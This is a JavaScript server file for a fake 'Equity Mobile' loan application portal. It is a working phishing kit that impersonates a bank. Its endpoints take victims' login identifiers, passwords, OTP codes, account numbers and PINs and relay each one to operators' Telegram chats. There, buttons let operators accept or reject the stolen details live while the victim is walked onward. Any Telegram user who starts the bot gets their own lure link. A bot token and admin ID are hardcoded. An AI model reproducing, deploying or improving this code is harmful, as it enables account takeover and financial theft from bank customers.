/**
 * EQUITY MOBILE MULTI-COUNTRY LOAN PORTAL - SERVER
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        welcomeSent: rec.welcomeSent ?? false
      }]));
    }
  } catch (err) {}
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {}
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) return FALLBACK_ADMIN_ID;
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized && adminRecord.paid) return targetAdmin;
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  if (!TOKEN) return;
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || '';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      const existingAdmin = admins.get(chatId);

      if (!existingAdmin || !existingAdmin.welcomeSent) {
        admins.set(chatId, {
          authorized: true,
          paid: true,
          username,
          firstName,
          lastName,
          startedAt: existingAdmin?.startedAt || new Date(),
          welcomeSent: true
        });
        saveAdmins();

        const userLink = `${APP_URL}/?admin=${chatId}`;
        const startMessage = `🤖 *EQUITY MOBILE BOT READY*\n\n` +
                             `👤 *Admin Info:*\n` +
                             `• *Name:* ${firstName} ${lastName}\n` +
                             `• *Chat ID:* \`${chatId}\`\n\n` +
                             `🔗 *Your Loan Application Link:*\n${userLink}`;

        await bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
      } else {
        await bot.sendMessage(chatId, `🟢 *Bot active.* Waiting for applicant data.`, { parse_mode: 'Markdown' });
      }
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_');
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'INVALID_CREDS':
          session.status = 'RETRY_CREDS';
          await bot.sendMessage(chatTarget, `❌ Account credentials rejected. Applicant prompted to re-enter.`);
          break;
        case 'CORRECT_CREDS':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ Credentials verified. Applicant proceeding to OTP page.`);
          break;
        case 'OTP_EXPIRES':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `⚠️ OTP code expired. Applicant requested to enter a new code.`);
          break;
        case 'OTP_ACCEPTED':
          session.status = 'PROCEED_PIN';
          await bot.sendMessage(chatTarget, `✅ OTP accepted. Applicant proceeding to PIN verification.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `❌ Account PIN incorrect. Applicant prompted to enter correct PIN.`);
          break;
        case 'CORRECT_PIN':
          session.status = 'PIN_CORRECT_WAITING';
          await bot.sendMessage(chatTarget, `✅ PIN verified. Final decision pending approval.`);
          break;
        case 'FINAL_APPROVED':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Application Approved! Applicant redirected to deposit screen.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: 'Processed' }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 3 Completion: Application Summary Notification
app.post('/api/submit-application-summary', async (req, res) => {
  try {
    let { fullName, phone, loanType, loanAmount, loanMonths, country, adminChatId } = req.body || {};
    const targetChat = resolveTargetChat(adminChatId);
    const userId = `applicant_${Date.now()}`;

    sessions.set(userId, {
      fullName, phone, loanType, loanAmount, loanMonths, country,
      adminChatId: targetChat,
      status: 'SUMMARY_SUBMITTED'
    });

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *EQUITY MOKOPO - STEP 3*   │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 🌍 *Country:* \`${country || 'Tanzania'}\`\n` +
                    `│ 👤 *Name:* \`${fullName || 'N/A'}\`\n` +
                    `│ 📱 *Phone:* \`${phone || 'N/A'}\`\n` +
                    `│ 💰 *Amount:* \`${loanAmount}\` (${loanMonths} Months)\n` +
                    `└──────────────────────────────┘`;

    if (bot) await bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' });
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Server Error' });
  }
});

// Step 4: Login Credentials (Email/Phone & Password)
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { userId, country, loginIdentifier, password } = req.body || {};
    let session = sessions.get(userId);
    if (!session) {
      session = { adminChatId: resolveTargetChat(req.body.adminChatId) };
      sessions.set(userId, session);
    }

    const targetChat = session.adminChatId;
    session.status = 'WAITING_CREDS_APPROVAL';
    session.loginIdentifier = loginIdentifier;
    session.password = password;
    session.country = country;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *EQUITY MOBILE - LOGIN*    │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 🌍 *Country:* \`${country}\`\n` +
                    `│ 👤 *User:* \`${loginIdentifier}\`\n` +
                    `│ 🔒 *Password:* \`${password}\`\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'INVALID ACC. DETAILS', callback_data: `INVALID_CREDS_${userId}` },
            { text: 'CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Server Error' });
  }
});

// Step 5: OTP Verification
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *EQUITY MOBILE - OTP*      │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 🔑 *OTP Code:* \`${otp}\`          │\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'OTP EXPIRES', callback_data: `OTP_EXPIRES_${userId}` },
            { text: 'OTP ACCEPTED', callback_data: `OTP_ACCEPTED_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Server Error' });
  }
});

// Step 6: Account Number & PIN Verification
app.post('/api/submit-pin-details', async (req, res) => {
  try {
    const { userId, accountNumber, accountPin } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_PIN_VERIFICATION';
    session.accountNumber = accountNumber;
    session.accountPin = accountPin;

    const message = `┌──────────────────────────────┐\n` +
                    `│ 🔴 *EQUITY MOBILE - PIN DATA* │\n` +
                    `├──────────────────────────────┤\n` +
                    `│ 💳 *Account No:* \`${accountNumber}\`\n` +
                    `│ 🔒 *Account PIN:* \`${accountPin}\`      │\n` +
                    `└──────────────────────────────┘`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: 'CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
          ],
          [
            { text: 'APPROVED', callback_data: `FINAL_APPROVED_${userId}` }
          ]
        ]
      }
    };

    if (bot) await bot.sendMessage(targetChat, message, opts);
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Server Error' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
  
